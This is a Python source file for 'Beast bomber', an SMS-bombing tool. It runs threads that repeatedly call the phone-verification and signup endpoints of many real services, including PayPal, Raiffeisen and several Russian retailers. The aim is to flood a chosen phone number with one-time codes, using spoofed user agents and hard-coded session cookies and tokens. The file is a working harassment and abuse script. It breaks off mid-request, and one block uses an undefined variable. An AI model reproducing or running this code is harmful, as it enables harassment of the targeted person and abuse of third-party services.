"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import requests
import time
import json
import random
from threading import Thread
from fake_useragent import UserAgent

ua = UserAgent()


def start_sms(number, threads, time_a, proxy):
    if proxy == "no":
        for _ in range(threads):
            th = Thread(target=sms_attack, args=(number, time_a))
            th.start()

    else:
        for _ in range(threads):
            th = Thread(target=sms_attack2, args=(number, time_a))
            th.start()


def sms_attack(number, time_a):
    t = time.monotonic()
    while time.monotonic() - t < time_a:
        user = ua.random

        try:
            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"
            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Cookie': 'qrator_jsr=1667424883.450.WZCPaRenglZkPePI-le2oklkm6aealchhhqnor0ksad5pa0s4-00; qrator_jsid=1667424883.450.WZCPaRenglZkPePI-sgbkkeibpqb9vhtdjv53ptu59lrblf59; currentDeliveryMode=pickup; currentRegion=RU-MOW; currentPOS=C027; qrator_ssid=1667424884.336.vAWpAHFmUYrSKIL0-t6ndf70f5ulevfvnj4dea98eujk6bblt; dtCookie=v_4_srv_39_sn_4A026F2CA6150477AA79F3D3D29C365A_perc_100000_ol_0_mul_1_app-3Ab08f9e5bb12c9b66_1; anonymous-consents=%5B%7B%22templateCode%22%3A%22adpr%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22generic%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22marketing%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%5D; cookie-notification=NOT_ACCEPTED; JSESSIONID=9426f45a-1a18-4d99-abec-2ca10dcab1b3; rxVisitor=16674248997432H1LVL8LKQFJ1AC7U29NEJ065IC6TBK3; advcake_track_id=1a2167a0-b7b2-3dba-89cc-e4e3b3482257; advcake_session_id=2eecc76c-73c8-fa92-f834-af5579620a7c; age-confirmed=1; isNearestPos=false; dtSa=-; dtLatC=139; rxvt=1667426797286|1667424899744; dtPC=39$24921274_828h-vJTNEWOCKEKFPJUGCSVBMURFFGRNVUWUM-0e0',
                'Host': 'www.winelab.ru',
                'Referer': 'https://www.winelab.ru/login/register',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            requests.get(f'https://www.winelab.ru/login/send/confirmationcode?number={num2}&_=1667424921408', headers=header)
        except:
            pass
        try:
            num2 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '2168',
                'content-type': 'application/json',
                'cookie': 'city=spb; site_version=desktop; first_hit_url=%2F; uid=8ABABAB98EEC626328515E670203D03D; sid=ubq6imNi7I5nXlEoPdADAg==; _gcl_au=1.1.1810282558.1667427483; _ga=GA1.2.648055991.1667427484; _gid=GA1.2.1544660882.1667427484; _gat_UA-51788549-1=1; tmr_lvid=10a4fa8a9fdf0837aa2f832f43e0c879; tmr_lvidTS=1667427483587; _ym_uid=1667427484751794767; _ym_d=1667427484; st_uid=aecf6f00f48400b66c1f81734929fecf; _ym_isad=2; advcake_track_id=49bca5f7-e704-1a53-a041-5e968b832d6e; advcake_session_id=ff6fe018-2736-375f-542e-f888f3e85acb; _tt_enable_cookie=1; _ttp=c729a64e-7d87-49df-b327-4af15846ef99; geo_city_confirmed=yes; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiZTQ5NmIxMjItYTBhNy00ZThjLTkwNDktNDcyZGZlNmUzMDdmIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6IjE0OWFlMTRmLWIzOTItNGU4Ny04Zjk5LTVmYzg2YmE4MTY1YiIsImlhdCI6MTY2NzQyNzQ3MSwiZXhwIjoxNjY3NDI4MDcxLCJqdGkiOiJlNDk2YjEyMi1hMGE3LTRlOGMtOTA0OS00NzJkZmU2ZTMwN2YifQ.b4wuFVvFBpNvOpK413eU6ixLUYe6TlL3Vdgdz0Cf4-g; tmr_detect=0%7C1667427486358; ets=%2F%2C%2C1667427483; wtfId=1724712-1667427483.865-178.170.198.53-56020; _ga_FRVD1KH7N7=GS1.1.1667427483.1.1.1667427497.46.0.0; tmr_reqNum=4',
                'origin': 'https://spb.profi.ru',
                'referer': 'https://spb.profi.ru/cabinet/login/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-app-id': 'PROFI',
                'x-new-auth-compatible': '1',
                'x-requested-with': 'XMLHttpRequest',
                'x-wtf-id': '1724712-1667427470.069-178.170.198.53-56020'
            }

            payload = {"query":"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}","variables":{"type":"phone","initialState":{"phoneNumber":num2,"defaultOrderCityId":"spb-prfr","currentHost":"https://spb.profi.ru"}}}

            requests.post('https://spb.profi.ru/graphql', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': '__ddg1_=Ugw1h8FzFgIdsoFRF8oF; PHPSESSID=bl2srubtrv1nplb0gd05a2729n; cguuid=1667495511_bl2srubtrv1nplb0gd05a2729n; chg_ref=https%3A%2F%2Fwww.google.com%2F; chg_req=https%3A%2F%2Fwww.chitai-gorod.ru%2F; cityId=213; cityName=%C3%EE%F0%EE%E4%20%CC%EE%F1%EA%E2%E0; countryId=643; countryName=%D0%EE%F1%F1%E8%FF; newsite=1; VisitorId=3ee9d4ec-5370-43ea-8217-af98e2de47cb; showed_action-banner-244=1',
                'origin': 'https://www.chitai-gorod.ru',
                'referer': 'https://www.chitai-gorod.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user
            }

            requests.get(f'https://webapi.chitai-gorod.ru/web/verify/phone/send?token=123&action=create&data%5Bphone%5D=%2B{number}&data%5Btype%5D=1',
                         headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '78',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'partial_language=en_US; _fbp=fb.1.1667496668749.461913499; mr1lad=6363fac161afbe3b-300-100-; language=fr_FR; auth=eyJpdiI6Ik1MK2w3VUNxM3JqL3Zhb1p2aDNhU2c9PSIsInZhbHVlIjoiYXVRVHRYdUVZNXdqbkNGcWhBWW9ydXdBbmlzWmFZWjNCSUZ4YytPU0Z2UEEvRmxBMFZ5VGFhMkYyZkU4QmRYRCIsIm1hYyI6IjQ1ZTJiYWU4MDIyZDljOTFlNGViYzA0YzY2ZDcwOTliOTRkMDE1ZDAxYWVmMGRkNThmMDE4OTEzZjA5N2IzZDYiLCJ0YWciOiIifQ%3D%3D; PHPSESSID=a30citc5pten82bespfnhas1id; apid=297148026_47ac992f59a9435b6996d59673f31476; XSRF-TOKEN=eyJpdiI6Ild6NHRRcjc1d3hBTlRwNEMvd2VOaHc9PSIsInZhbHVlIjoiS1Q5ejlUWnJNalNsRGtNL0k5VmlQd01JcmlpczFjWndPY0JCSXA4dkY1dUd0WHRmSS9MR0M4eWJ0MHQ1bHBtMU54ei9rWFl0TGhZR2hUYlFmcDhqTk1LdEtuNnpxY3FzVm14OTB3N1EwZEtERW9Mbmc0bTFabXk5OU1KY3hVd0giLCJtYWMiOiJkZWI5Yjc1ZDc5N2ZmZWJlNjBjMzljZTZhZTI2Y2I0MDA0NTQ4NGJlNmMzYTA1N2VmZTQ0MmY0NzYwNmI2OTY4IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkxkUzczcXFuUG9EbkcxTUtVcHBINkE9PSIsInZhbHVlIjoidWlnOEJBVWNPUHluZzJuZzVEVmRKVERIMmxRdHJ3NzRsajViSlhLRTRpdGdQZlF3R0M2THhvQWREb3Z0NmV6K3RYZ2d6cmFjU1ltNFZLajhhVnhSb3R2QlFCZWhMMnYwSnV4L2pmaVF4c2hmcEZ2R050a21HVGZURUtiMG14c3ciLCJtYWMiOiI3NzY0MDZlOGVjYmRiMmQ3ZDNiY2NiODYwMjA2MGZiOTlhZTQxMTQxYWFkNGYyZmQzN2QwMGQzOWI5YThhM2FiIiwidGFnIjoiIn0%3D; cookies_warning=1',
                'origin': 'https://www.donationalerts.com',
                'referer': 'https://www.donationalerts.com/dashboard/general-settings',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'data': f'phone_number=%2B{number}&tf_signature=',
                'form': 'two_factor_connect'
            }

            requests.post('https://www.donationalerts.com/ajax/twofactor/connect', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'content-length': '88',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'dnt': '1',
                'origin': 'https://widget.verifykit.com',
                'referer': 'https://widget.verifykit.com/v2.1/?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246&lang=ru',
                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            payload = {
                'countryCode': 'RU',
                'isMobileBrowser': '0',
                'phoneOperatingSystem': 'android',
                'phoneNumber': '+'+number
            }

            requests.post('https://widget.verifykit.com/v2.1/otp-start?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '23',
                'Content-Type': 'application/json',
                'Cookie': 'city_auto_popup_shown=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ccart=off; auid=70bba744-aa2a-47c9-aa2e-fcc429e8b30e:1oqeEy:5gdON_o33Prcb_-QzdVY-fFJmZDtA4P1zgyTPlEaZzs',
                'Host': 'api.sunlight.net',
                'Origin': 'https://sunlight.net',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {
                "phone": number
            }

            requests.post('https://api.sunlight.net/v3/customers/authorization/', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '491',
                'content-type': 'application/json;charset=UTF-8',
                'cookie': 'cookie_check=yes; l7_az=dcg13.slc; ts_c=vr%3D3e99499a1840a7a85b13e8eefea07218%26vt%3D3e99499a1840a7a85b13e8eefea07217; cookie_prefs=T%3D0%2CP%3D0%2CF%3D0%2Ctype%3Dexplicit_banner; TLTSID=13181915649569552210254340983466; KHcl0EuY7AKSMgfvHl7J5E7hPtK=V1UVv_rCpouveOJaC68dtRfVkQIfTjOas2fZ6RcFKZK7VfUBI5XEkaev-A1pe11eavhzg7eXC79A0ilK; ddi=DSVyKWWybP-200lx8MsKHE1l2UDCih_iD04O2K7I5WAHk5OV-G116VOmsvJmwFLdkg8yS_1NASNzKK37eNI0YKTprEiFCdtR844oT4szEkoEzci6; LANG=fr_XC%3BKZ; nsid=s%3A8P1aDLhmKkjuM6jrcJB0Q8hs7aSwUv2b.j9ne4A63KYkazQsLGO3LtCWaEiWtTXsxGfE7RP2ChZc; tsrce=authchallengenodeweb; x-pp-s=eyJ0IjoiMTY2NzQ5NzU2NDQyNSIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1762195564%26vteXpYrS%3D1667499364%26vr%3D3e99499a1840a7a85b13e8eefea07218%26vt%3D3e99499a1840a7a85b13e8eefea07217%26vtyp%3Dnew; tcs=main%3Aonbrd%3Asignup%3Aorganic%7CpaypalAccountData_submit',
                'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/kz/welcome/signup/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-csrf-token': 'jy4wGt5Yf5n2oBeYlSBCj0hpEjlTaVz+2f6jg=',
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {"/appData/action":"init_phone_confirmation","/appData/griffinData":"true","/initiatePhoneConfirmData/phoneCountry":"KZ","/paypalAccountData/phoneOption":"Mobile","/paypalAccountData/phoneNumber":number[1:],"/paypalAccountData/phoneCountryCode":"7","/paypalAccountData/createUpdateReady":False,"/initiatePhoneConfirmData/sendSms":"yes","/initiatePhoneConfirmData/createUpdateReady":True,"/initiatePhoneConfirmData/phoneNumber":number[1:],"/initiatePhoneConfirmData/phoneCountryCode":"7"}

            requests.post('https://www.paypal.com/KZ/welcome/signup', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
                'cookie': '_pcl=eW5jY/+J6eIKrg==; old_design=0; is_show_welcome_mechanics=1; _tuid=bfa4749db8e83787741b6d039407f632bf8c7dd1; _space=psk_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_analytics=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_main_1_1_98=3; _slfs=1667497919016; _slid=6363ffb10ae16ce93d0f54eb; _slsession=22984220-F353-40B5-9A72-0604DF3D4AC9; _slfreq=6347f312d9062ed0380b52dc%3A6347f38c9a3f3b9e90027775%3A1667505121; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; _slid_server=6363ffb10ae16ce93d0f54eb',
                'origin': 'https://www.citilink.ru',
                'referer': 'https://www.citilink.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            requests.post(f'https://www.citilink.ru/registration/confirm/phone/+{number}/', headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'Connection': 'keep-alive',
                'Content-Length': '24',
                'Content-Type': 'application/json',
                'Cookie': 'geo_region_url=www; _ym_uid=16563772911015405951; _ym_d=1656377291; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_site=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; _ga=GA1.2.8228657.1662288395; _gid=GA1.2.158704625.1662288395; _gat=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20OPR%2F89.0.4447.104; _ym_isad=1; _ym_visorc=w; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=; geo_detect_url=www; geo_detect=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_detect_coords=55.755787%2C37.617634; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form',
                'DNT': '1',
                'Host': 'oapi.raiffeisen.ru',
                'Origin': 'https://www.raiffeisen.ru',
                'Referer': 'https://www.raiffeisen.ru/retail/cards/debit/cashback-card/',
                'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {"number": number}

            requests.post('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms', json=payload, headers=header)
        except:
            pass
        try:
            num2 = f"+7 ({number[1:4]}) {number[4:7]} - {number[7:9]} - {number[9:]}"


            header = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '313',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'city=%D0%A3%D1%84%D0%B0; city_auto=%D0%A3%D1%84%D0%B0; PHPSESSID=ugHRLR16ZdJVadoHoKz3DsoBv7tgcTu3; BITRIX_SM_GUEST_ID=3219922; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A9%2C%22EXPIRE%22%3A1667509140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; city_checked=true; BITRIX_SM_LAST_VISIT=03.11.2022%2022%3A42%3A44',
                'origin': 'https://madyart.ru',
                'referer': 'https://madyart.ru/reg/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'wct_reg_fio': 'Кондратьев',
                'wct_reg_fio2': 'Василий',
                'wct_reg_phone': num2,
                'wct_reg_ch': 'Y',
                'wct_reg_1': '',
                'wct_reg_2': '',
                'wct_reg_3': '1',
                'USER_PHONE': '7',
                'USER_PHONE2': '',
                'LOGIN1': '0322',
                'LOGIN2': '0323',
                'wc_phone_psw': 'Hoho_HO123',
                'wc_phone_psw2': 'Hoho_HO123'
            }

            requests.post('https://madyart.ru/local/aut.php', data=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '673',
                'Content-Type': 'application/json;charset=UTF-8',
                'Host': 'admin.growfood.pro',
                'Origin': 'https://growfood.pro',
                'Referer': 'https://growfood.pro/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {"analyticalData":{"cookie":{"new_site":"old","_ga":"GA1.2.2803055798.1667505193","_ym_uid":"1667505193311447307","default_city":"msk","gfab_ninja":"ninja","gfab_ssr_vs_spa":"spa","gfab_ssr_vs_spa2":"spa","gfab_ssr_vs_spa3":"spa","gfab_popup_test":"empty","gfab_drinks_price":"empty","gfab_newgf_new_unauthorized":"empty","gfab_for-suppliers":"enable-for-suppliers","last_ga_session_loading_number":"0","owox_session_id":"2803055798.1667505193_1667505197845","city_confirmed":"true","selected_target":"p2","_efst":"945447c2f000a249a96b6e6b10f462844f3b06628854b34613dea1c11eb93041"}},"client":{"phone":num2,"recaptchaToken":None,"cityId":2},"brandId_H":"lY"}

            requests.post('https://admin.growfood.pro/api/personal-cabinet/v1/authentication/send-sms', json=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-type': 'application/json',
                'cookie': 'anonymous_user_cart=; anonymous_user_last_viewed=; anonymous_user_wishlist=; anonymous_user_city=; COOKIE-BEARER=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1NTY2MjU3NjA4OSIsImF1dGhvcml0aWVzIjoiUk9MRV9BTk9OWU1PVVMiLCJzaXRlSWQiOiJzdG9yZU1vYmlsZVJVIiwiaWF0IjoxNjY3NTA1ODIzLCJleHAiOjE2Njc1OTIyMjN9.BSzBym8eES4E80HM7Aejqq5BMzS-3pJNxmW8uSPMssqRBZXe-RHWxoVJ2_x7N_ptG0NW-z73EtvKM4uj7d-AeQ; JSESSIONID=RIVGvSdI6jXgarX8Qdj6bmxpy6Q_.letu-wru-07; language=ru-RU; cityDetected=true; ssaid=a6998a60-5bb2-11ed-a966-139fd8fbcf9d; iap.uid=3460084562364d5c80ba900934b73c9c; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; cityGuessed=true; __tld__=null',
                'referer': 'https://www.letu.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw'
            }

            requests.get(
                f'https://www.letu.ru/s/api/user/account/v1/verifications/phone?pushSite=storeMobileRU&phone=%2B7+%28{num[1]+num[2]+num[3]}%29+{num[4]+num[5]+num[6]}-{num[7]+num[8]}-{num[9]+num[10]}',
                headers=header)

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '49',
                'content-type': 'application/json',
